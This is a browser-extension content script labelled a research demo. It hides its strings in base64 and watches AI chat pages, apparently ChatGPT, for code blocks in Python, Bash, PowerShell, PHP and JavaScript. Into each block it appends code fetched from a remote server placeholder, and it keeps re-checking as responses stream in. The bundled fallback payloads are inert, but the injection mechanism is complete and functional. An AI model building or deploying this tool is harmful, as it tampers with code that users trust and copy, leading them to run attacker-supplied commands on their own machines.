// Content Modifier Extension (Demo)
console.log('[+] ' + atob('UmVzZWFyY2ggRGVtbzogQ29udHJvbGxlZCB0ZXN0IGVudmlyb25tZW50IG9ubHku'));

// API endpoint for fetching data (placeholder for local server)
const API_URL = 'https://<FLASK_SERVER>:<PORT>/' + atob('ZGF0YQ=='); // "/data"

// Cache for fetched data
const dataCache = new Map();

// Default payloads for fallback
const FALLBACK_CONTENT = {
  python: '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)\nprint("Simulated fallback Python content")',
  javascript: '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)\nconsole.log("Simulated fallback JavaScript content")',
  bash: '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)\necho "Simulated fallback Bash content"',
  powershell: '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)\nWrite-Output "Simulated fallback PowerShell content"',
  php: '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)\necho "Simulated fallback PHP content"',
  default: '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)\necho "Simulated fallback default content"'
};

// Utility to decode and execute DOM operations
const x = (el, prop, val) => {
  const p = atob(prop);
  if (val !== undefined) el[p] += `\n${val}`;
  return el[p];
};

// Pre-fetch known data types
const KNOWN_TYPES = ['python', 'javascript', 'bash', 'powershell', 'php', 'default'];
async function preloadData(retryCount = 0) {
  console.log('[+] Preloading data for known types');
  for (const type of KNOWN_TYPES) {
    if (dataCache.has(type)) continue;
    try {
      const response = await fetch(`${API_URL}?${atob('dHlwZQ==')}=${encodeURIComponent(type)}`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' }
      });
      if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
      const data = await response.json();
      dataCache.set(type, data[atob('Y29udGVudA==')] || FALLBACK_CONTENT[type]);
      console.log(`[+] Preloaded data for ${type}`);
    } catch (error) {
      console.error(`[-] Error preloading data for ${type}: ${error.message}`);
      dataCache.set(type, FALLBACK_CONTENT[type]);
      if (retryCount < 2) {
        console.log(`[+] Retrying preload for ${type} (${retryCount + 1}/2)`);
        setTimeout(() => preloadData(retryCount + 1), 1000);
      }
    }
  }
}

// Function to get cached data
function getData(type) {
  return dataCache.get(type) || FALLBACK_CONTENT[type] || '// ' + atob('UmVzZWFyY2ggRGVtbw==') + ' (Non-functional)';
}

// Function to update code blocks
function updateBlocks(els, source = 'unknown') {
  if (!els.length) {
    console.log(`[-] No blocks found (Source: ${source})`);
    return;
  }
  console.log(`[+] Found ${els.length} blocks (Source: ${source})`);
  for (const el of els) {
    try {
      const parent = el.closest(atob('cHJl')) || el.closest(atob('ZGl2LmNvbnRhaW4taW5saW5lLXNpemU=')); // "pre" or "div.contain-inline-size"
      const typeDiv = parent?.querySelector(atob('ZGl2W2NsYXNzKj0ibGFuZ3VhZ2UtIl0sIHNwYW5bY2xhc3MqPSJsYW5ndWFnZS0iXSwgZGl2W2NsYXNzKj0idGV4dC0iXSwgc3BhbltjbGFzcyo9InRleHQtIl0sIGRpdltjbGFzcyo9InRleHQtcnMtZm9udC1zYW5zIl0=')) ||
                      parent?.parentElement?.querySelector(atob('ZGl2W2NsYXNzKj0ibGFuZ3VhZ2UtIl0sIHNwYW5bY2xhc3MqPSJsYW5ndWFnZS0iXQ=='));
      let type = typeDiv?.[atob('aW5uZXJUZXh0')]?.toLowerCase().trim() || 'unknown';
      
      if (type === 'Python') type = 'python';
      if (type === 'JavaScript') type = 'javascript';
      if (type === 'Bash') type = 'bash';
      if (type === 'PowerShell') type = 'powershell';
      if (type === 'PHP') type = 'php';
      
      console.log(`[+] Detected type: ${type}, TypeDiv:`, typeDiv, `Text:`, typeDiv?.[atob('aW5uZXJUZXh0')]);

      if (type === 'unknown') {
        console.log(`[-] Skipping update for unknown type (Source: ${source})`);
        continue;
      }

      const content = getData(type);
      
      if (x(el, 'aW5uZXJUZXh0') && !x(el, 'aW5uZXJUZXh0').includes(atob('UmVzZWFyY2ggRGVtbw==')) && typeof x(el, 'aW5uZXJUZXh0') === 'string') {
        x(el, 'aW5uZXJUZXh0', content);
        console.log(`[+] Updated ${type} block (Source: ${source})`);
      } else {
        console.log(`[-] Skipped update for ${type} (already updated or no text)`);
      }
    } catch (error) {
      console.error(`[-] Error updating block: ${error.message}`);
    }
  }
}

// Observe DOM changes
const observer = new MutationObserver(mutations => {
  mutations.forEach(m => {
    m.addedNodes.forEach(node => {
      if (node.nodeType === 1) {
        const els = node.querySelectorAll(atob('cHJlIGNvZGUsIGRpdltjbGFzcyo9ImNvZGUiXSBjb2RlLCBkaXZbY2xhc3MqPSJjb250YWluLWlubGluZS1zaXplIl0gZGl2W2NsYXNzKj0ib3ZlcmZsb3cteS1hdXRvIl0gY29kZQ=='));
        updateBlocks(els, 'MutationObserver');
      }
    });
  });
});

// Start observing and preload data
window.addEventListener('load', () => {
  console.log('[+] Content Modifier Extension loaded (' + atob('UmVzZWFyY2ggRGVtbw==') + ')');
  // Start observing immediately
  const main = document.querySelector(atob('bWFpbg=='));
  if (main) {
    observer.observe(main, { childList: true, subtree: true, characterData: true }); // Added characterData for streaming
    const els = document.querySelectorAll(atob('cHJlIGNvZGUsIGRpdltjbGFzcyo9ImNvZGUiXSBjb2RlLCBkaXZbY2xhc3MqPSJjb250YWluLWlubGluZS1zaXplIl0gZGl2W2NsYXNzKj0ib3ZlcmZsb3cteS1hdXRvIl0gY29kZQ=='));
    updateBlocks(els, 'Initial Load');
  } else {
    console.warn('[-] Main element not found');
  }
  // Preload data asynchronously
  preloadData();
  // Fallback: Periodically check for new blocks and retry preload
  let updateCount = 0;
  const maxUpdates = 50;
  const interval = setInterval(() => {
    if (dataCache.size < KNOWN_TYPES.length) preloadData();
    const els = document.querySelectorAll(atob('cHJlIGNvZGUsIGRpdltjbGFzcyo9ImNvZGUiXSBjb2RlLCBkaXZbY2xhc3MqPSJjb250YWluLWlubGluZS1zaXplIl0gZGl2W2NsYXNzKj0ib3ZlcmZsb3cteS1hdXRvIl0gY29kZQ=='));
    updateBlocks(els, 'Interval Check');
    updateCount += els.length;
    if (updateCount >= maxUpdates) {
      console.log('[+] Stopping interval after reaching update limit');
      clearInterval(interval);
    }
  }, 250); // Faster interval for streaming
});
